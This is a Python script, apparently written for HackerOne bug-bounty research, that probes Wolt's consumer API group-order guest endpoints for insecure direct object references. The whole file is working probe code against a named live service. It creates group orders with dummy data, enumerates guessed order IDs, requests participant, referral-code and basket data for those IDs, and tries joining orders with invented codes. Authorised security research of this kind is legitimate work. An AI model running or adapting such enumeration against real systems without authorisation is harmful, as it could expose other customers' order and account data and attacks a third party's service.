"""Group Order guest endpoint IDOR & enumeration."""
import requests, random, string

H = {
    'User-Agent': 'Mozilla/5.0',
    'Origin': 'https://wolt.com',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
}

BASE = 'https://consumer-api.wolt.com'
GUEST = '/v1/group_order/guest'
AUTH = '/v1/group_order'

def req(method, path, body=None):
    kwargs = {'headers': H}
    if body:
        kwargs['json'] = body
    r = requests.request(method, BASE + path, **kwargs)
    return r.status_code, (r.json() if 'json' in r.headers.get('content-type','') else r.text[:200])

# ====== 1. Create a group order (guest) ======
print("=== 1. CREATE GROUP ORDER ===")
# Try both O7 (authenticated) and Sr (guest join)
# From JS: O7: ({details:e}) => POST /v1/group_order/
# Sr: (e,t) => POST /v1/group_order/guest/join/{code}

# First, try to create via POST /v1/group_order/ with dummy details
create_body = {
    'details': {
        'name': 'Test Group Order',
        'venue_id': '60ebeb71c6904c2caf035f71',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
    }
}
code, res = req('POST', AUTH + '/', create_body)
print(f"  POST {AUTH}/  -> {code} | {str(res)[:300]}")

# Try with different formats
for variant in [
    ({'venue_id': '60ebeb71c6904c2caf035f71'}, 'minimal'),
    ({'name': 'test'}, 'name only'),
    ({}, 'empty'),
]:
    code, res = req('POST', AUTH + '/', variant)
    print(f"  POST {variant[1]:15s} -> {code} | {str(res)[:200]}")

# ====== 2. Try to enumerate group order IDs ======
print("\n=== 2. ID ENUMERATION ===")
# Group order IDs might be sequential or UUID
# Try some common patterns
test_ids = [
    # Numeric sequential
    '1', '100', '1000', '10000',
    # Typical Mongo ObjectId length
    '507f1f77bcf86cd799439011',
    # Random UUID
    str(random.randint(100000, 999999)),
]

for gid in test_ids:
    code, res = req('GET', f'{GUEST}/{gid}/participants/me')
    if code != 404:
        print(f"  GET {GUEST}/{gid}/participants/me -> {code} | {str(res)[:200]}")
    code2, res2 = req('GET', f'{GUEST}/code/{gid}')
    if code2 != 404:
        print(f"  GET {GUEST}/code/{gid} -> {code2} | {str(res2)[:200]}")

# ====== 3. Referral code enumeration ======
print("\n=== 3. REFERRAL CODE ===")
for gid in test_ids[:4]:
    code, res = req('GET', f'{GUEST}/{gid}/referral_code')
    if code != 404:
        print(f"  GET {GUEST}/{gid}/referral_code -> {code} | {str(res)[:200]}")

# ====== 4. Try to join via invented code ======
print("\n=== 4. JOIN VIA CODE ===")
test_codes = ['test', 'abcd', '1234', 'ABCD1234', '', ' ']
for tc in test_codes:
    code, res = req('POST', f'{GUEST}/join/{tc}', {'name': 'test_user'})
    if code not in [404, 400]:
        print(f"  POST {GUEST}/join/{tc} -> {code} | {str(res)[:200]}")

# ====== 5. Try to create group order via guest path ======
print("\n=== 5. CREATE VIA GUEST PATH ===")
for body in [
    {},
    {'details': {'name': 'test'}},
    {'venue_id': '60ebeb71c6904c2caf035f71'},
]:
    code, res = req('POST', GUEST + '/', body)
    print(f"  POST {GUEST}/ -> {code} | {str(res)[:200]}")

# ====== 6. Basket operations on guest group orders ======
print("\n=== 6. BASKET OPS (guess IDs) ===")
for gid in ['1', 'test', 'guest_test']:
    code, res = req('GET', f'{GUEST}/{gid}/participants/me/basket')
    if code != 404:
        print(f"  GET {GUEST}/{gid}/participants/me/basket -> {code}")

print("\n=== DONE ===")
